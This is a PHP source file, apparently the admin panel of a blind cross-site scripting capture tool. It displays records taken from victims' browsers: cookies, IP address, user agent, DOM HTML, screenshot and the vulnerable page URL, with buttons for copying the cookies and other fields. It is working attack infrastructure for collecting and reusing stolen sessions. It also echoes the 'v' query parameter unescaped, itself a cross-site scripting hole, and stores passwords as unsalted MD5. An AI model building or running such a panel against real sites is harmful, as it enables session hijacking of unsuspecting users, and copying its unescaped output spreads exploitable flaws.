<?php
session_start();
include("../inc/conf.php");
error_reporting(0);

if(!empty($pass)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $pass))
        $_SESSION['auth'] = md5($_POST['pass']);
    if (!isset($_SESSION['auth']) || ($_SESSION['auth'] != $pass))
        login();
}

if(isset($_GET['logout'])){
	session_destroy();
	header("location: ?");
}

if(isset($_GET['del'])){
	delete($db, $_GET['del']);
	header('location: ?');
}

$t = count(array_filter(json_decode(getAll($db))->result));
include("header.php");

if(isset($_GET['v'])){
	$d = json_decode(get($db, $_GET['v']))->result;

?>
    <!-- Page Content -->
    <div class="container">
    	<div class="jumbotron">
    		<div class="row">
    			<div class="col-md-12"> 
					<div class="card">
						<div class="card-header">
							<span class="text-mono text-<?=$warna;?>">
					  		<span class="fa fa-camera"></span> Screenshot
					  		</span>
					  		<a href="<?=$d->screenshot;?>" class="btn btn-shadow btn-sm btn-outline-<?=$warna;?>" download>
								<span class="fa fa-download"></span>
							</a>					  		
						</div>
						<div class="card-body">
						  	<img class="card-img-top" src="<?=$d->screenshot;?>" style="background-color:white;">
						</div>
						<div class="card-footer text-muted">
						    <div class="text-mono text-<?=$warna;?>">
					  			<span class="fa fa-clock-o"></span> <?=$d->datetime;?>
					  		</div>
						</div>
					</div>
					<hr>
				</div>
				<div class="col-md-6"> 
					<div class="card">
						<div class="card-header">
							<span class="text-mono text-<?=$warna;?>">
					  		<span class="fa fa-bug"></span> Vulnerable Page Url
					  		</span>					  		
						</div>
						<div class="card-body">
						  	<span class="text-mono text-<?=$warna;?>">
					  			<?=htmlentities($d->uri);?>
					  		</span>
						</div>
					</div>
					<hr>
				</div>
				<div class="col-md-6"> 
					<div class="card">
						<div class="card-header">
							<span class="text-mono text-<?=$warna;?>">
					  		<span class="fa fa-globe"></span> Execution Origin
					  		</span>					  		
						</div>
						<div class="card-body">
						  	<span class="text-mono text-<?=$warna;?>">
					  			<?=htmlentities($d->origin);?>
					  		</span>
						</div>
					</div>
					<hr>
				</div>
				<div class="col-md-6"> 
					<div class="card">
						<div class="card-header">
							<span class="text-mono text-<?=$warna;?>">
					  		<span class="fa fa-globe"></span> Referer
					  		</span>					  		
						</div>
						<div class="card-body">
						  	<span class="text-mono text-<?=$warna;?>">
					  			<?=htmlentities($d->referer);?>
					  		</span>
						</div>
					</div>
					<hr>
				</div>
				<div class="col-md-6"> 
					<div class="card">
						<div class="card-header">
							<span class="text-mono text-<?=$warna;?>">
					  		<span class="fa fa-laptop"></span> Victim IP Address
					  		</span>					  		
						</div>
						<div class="card-body">
						  	<span class="text-mono text-<?=$warna;?>">
					  			<?=htmlentities($d->ip_address);?>
					  		</span>
						</div>
					</div>
					<hr>
				</div>
				<div class="col-md-12"> 
					<div class="card">
						<div class="card-header">
							<span class="text-mono text-<?=$warna;?>">
					  		<span class="fa fa-crosshairs"></span> Victim User Agent
					  		</span>
					  		<button onClick="document.getElementById('ua').select();document.execCommand('Copy');
  alert('Victim User Agent Copied');" class="btn btn-shadow btn-sm btn-outline-<?=$warna;?>">
								<span class="fa fa-code"></span>
							</button>
						</div>
						<div class="card-body">
							<div class="form-group">
						  		<textarea class="form-control" id="ua"><?=htmlentities($d->user_agent);?></textarea>
					  		</div>
						</div>
					</div>
					<hr>
				</div>
				<div class="col-md-12"> 
					<div class="card">
						<div class="card-header">
							<span class="text-mono text-<?=$warna;?>">
					  		<span class="fa fa-crosshairs"></span> Cookies
					  		</span>
					  		<button onClick="document.getElementById('cookies').select();document.execCommand('Copy');
  alert('Cookies Copied');" class="btn btn-shadow btn-sm btn-outline-<?=$warna;?>">
								<span class="fa fa-code"></span>
							</button>
						</div>
						<div class="card-body">
							<div class="form-group">
						  		<textarea class="form-control" id="cookies"><?=htmlentities($d->cookies);?></textarea>
					  		</div>
						</div>
					</div>
					<hr>
				</div>
				<div class="col-md-12"> 
					<div class="card">
						<div class="card-header">
							<span class="text-mono text-<?=$warna;?>">
					  		<span class="fa fa-crosshairs"></span> DOM HTML
					  		</span>

					  		<button onClick="document.getElementById('dom').select();document.execCommand('Copy');
  alert('DOM HTML Copied');" class="btn btn-shadow btn-sm btn-outline-<?=$warna;?>">
								<span class="fa fa-code"></span>
							</button>

						</div>
						<div class="card-body">
							<div class="form-group">
						  		<textarea class="form-control" id="dom"><?=htmlentities($d->dom);?></textarea>
					  		</div>
						</div>
					</div>
					<hr>
				</div>

    		</div>
				
           <!-- Pagination -->
			    <div class="pagination">			    	
			    	<div class="text-mono text-<?=$warna;?>">
					  	<span class="fa fa-book"> </span> <?=$_GET['v'];?>/<?=$t;?>
					</div>
				<?php
				    if ($_GET['v'] > 1)
				      	echo "<a class='btn btn-shadow btn-sm btn-outline-".$warna."' href='" . $_SERVER['PHP_SELF'] . "?v=" . ($_GET['v'] - 1) . "'><span class='fa fa-arrow-left'></span> Prev</a>";
				    if ($_GET['v'] < $t)
				        echo "<a class='btn btn-shadow btn-sm btn-outline-".$warna."' href='" . $_SERVER['PHP_SELF'] . "?v=" . ($_GET['v'] + 1) . "'>Next <span class='fa fa-arrow-right'></span></a>";
				      ?>
				    <a href="?del=<?=$_GET['v'];?>" class="btn btn-shadow btn-sm btn-outline-danger">
						<span class="fa fa-trash"></span>
						delete
					</a>
			    </div>
    	</div>
    </div>

<?php
}else{
	echo '<div "container"><div class="alert alert-danger" role="alert"><strong>Not Found :(</strong></div></div>';
}
include("footer.php");
?>